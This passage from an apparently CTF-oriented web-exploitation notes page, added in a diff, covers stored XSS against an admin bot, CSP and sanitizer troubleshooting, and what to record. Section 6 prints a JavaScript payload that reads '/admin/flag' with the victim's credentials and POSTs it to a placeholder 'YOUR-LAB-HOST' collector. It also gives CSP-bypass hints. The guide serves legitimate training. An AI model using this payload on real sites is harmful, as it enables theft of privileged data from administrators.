+<h2 id="6-stored-xss--admin-bot-complete-the-chain">6. Stored XSS / admin bot: complete the chain<a class="anchor" href="#6-stored-xss--admin-bot-complete-the-chain"></a></h2>
+<ol>
+<li>Determine exactly which URL the bot visits and whether it opens submitted links or a fixed moderation page.</li>
+<li>Store a proof that triggers without a click if the bot does not interact.</li>
+<li>Use the bot&rsquo;s same-origin privileges to read a documented challenge endpoint.</li>
+<li>Send only the intended challenge result to a permitted callback if event rules allow it.</li>
+</ol>
+<p>A payload body for a confirmed JavaScript sink:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>fetch<span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;/admin/flag&#39;</span><span style="color:#eceff4">,</span> <span style="color:#eceff4">{</span>credentials<span style="color:#81a1c1">:</span><span style="color:#a3be8c">&#39;same-origin&#39;</span><span style="color:#eceff4">})</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#eceff4">.</span>then<span style="color:#eceff4">(</span>r <span style="color:#eceff4">=&gt;</span> r<span style="color:#eceff4">.</span>text<span style="color:#eceff4">())</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#eceff4">.</span>then<span style="color:#eceff4">(</span>t <span style="color:#eceff4">=&gt;</span> fetch<span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;https://YOUR-LAB-HOST/collect&#39;</span><span style="color:#eceff4">,</span> <span style="color:#eceff4">{</span>
+</span></span><span style="display:flex;"><span>    method<span style="color:#81a1c1">:</span><span style="color:#a3be8c">&#39;POST&#39;</span><span style="color:#eceff4">,</span> mode<span style="color:#81a1c1">:</span><span style="color:#a3be8c">&#39;no-cors&#39;</span><span style="color:#eceff4">,</span> body<span style="color:#81a1c1">:</span>t
+</span></span><span style="display:flex;"><span>  <span style="color:#eceff4">}));</span></span></span></code></pre></div><p>Place that body in the <strong>proven execution context</strong>, not blindly in every HTML tag. <code>HttpOnly</code> prevents reading a cookie through <code>document.cookie</code>; it does not stop same-origin requests carrying the cookie. An admin token may instead be in storage or a request header. Cross-origin reading still follows CORS.</p>
+<p><code>no-cors</code> produces an opaque response; it does not let JS read an arbitrary origin. A CSP <code>connect-src</code> restriction can block the callback. A callback log proves some browser reached you; a unique route/token and returned content are needed to tie it to the bot.</p>
+<h2 id="7-csp-and-sanitization-troubleshooting">7. CSP and sanitization troubleshooting<a class="anchor" href="#7-csp-and-sanitization-troubleshooting"></a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Observation</th>
+          <th>Check next</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Tags show literally</td>
+          <td>HTML encoding or text sink; locate another render path</td>
+      </tr>
+      <tr>
+          <td>Image inserted but handler missing</td>
+          <td>Sanitizer removes event attributes</td>
+      </tr>
+      <tr>
+          <td>Handler present but no execution</td>
+          <td>Browser console CSP / sandbox errors</td>
+      </tr>
+      <tr>
+          <td><code>&lt;script&gt;</code> present but inert</td>
+          <td>DOM insertion method or script type</td>
+      </tr>
+      <tr>
+          <td>Works for you, not bot</td>
+          <td>Timing, login, bot URL, browser version, CSP, no interaction</td>
+      </tr>
+      <tr>
+          <td>Popup doesn&rsquo;t show</td>
+          <td>Headless dialogs may be suppressed; use a controlled DOM marker or permitted callback</td>
+      </tr>
+      <tr>
+          <td>Only <code>alert</code> blocked</td>
+          <td>Identify exact token transformation; do not assume all JS is blocked</td>
+      </tr>
+      <tr>
+          <td>Encoded payload remains encoded</td>
+          <td>Wrong decode layer; compare raw bytes and DOM</td>
+      </tr>
+  </tbody>
+</table>
+<p>Inspect <code>script-src</code>, nonces/hashes, <code>unsafe-inline</code>, <code>strict-dynamic</code>, <code>connect-src</code>, iframe <code>sandbox</code> and Trusted Types errors. A random nonce cannot be invented. An allowed host is only useful if it has a matching usable script gadget or attacker-controlled script content. Keep a minimal working payload before testing a bypass.</p>
+<h2 id="8-what-to-save">8. What to save<a class="anchor" href="#8-what-to-save"></a></h2>
+<p>Record input location, stored/reflected/DOM type, raw output context, escaping, browser behavior, CSP, bot route and final data source. “<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> failed” is not a useful diagnosis without its sink.</p>
+<p>Related: <a href="../ssti/">SSTI</a> for server evaluation; <a href="../csrf-cors/">CSRF/CORS</a> for requests made from another origin.</p>
+<h2 id="tool-workflow">Tool workflow<a class="anchor" href="#tool-workflow"></a></h2>
+<p>Use <a href="../../ajcbbc_allow_tools/burp_suite_community/">Burp Community Repeater</a> for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof.</p>
+<h2 id="references">References<a class="anchor" href="#references"></a></h2>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS">MDN XSS</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations">MDN innerHTML security considerations</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src">CSP script-src</a>.</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/web-expl/nosqli/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>NoSQL Injection · Operators &amp; Blind Reads</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/web-expl/auth-idor/" class="flex align-center">
+        <span>Auth &amp; IDOR · Compare Two Accounts</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        <div class="field-footer"><span>offsec-n0t3 <span aria-hidden="true">//</span> keep your findings close.</span><a href="#field-content">BACK TO TOP ↑</a></div>
+
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-map-source-and-sink">1. Map source and sink</a></li>
+    <li><a href="#2-html-text-first-proof">2. HTML text: first proof</a></li>
+    <li><a href="#3-attribute-contexts">3. Attribute contexts</a></li>
+    <li><a href="#4-javascript-contexts">4. JavaScript contexts</a></li>
+    <li><a href="#5-url-and-dom-sources">5. URL and DOM sources</a></li>
+    <li><a href="#6-stored-xss--admin-bot-complete-the-chain">6. Stored XSS / admin bot: complete the chain</a></li>
+    <li><a href="#7-csp-and-sanitization-troubleshooting">7. CSP and sanitization troubleshooting</a></li>
+    <li><a href="#8-what-to-save">8. What to save</a></li>
+    <li><a href="#tool-workflow">Tool workflow</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  <a class="skip-link" href="#field-content">Skip to notes</a>
+<div class="reading-progress" aria-hidden="true"></div>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
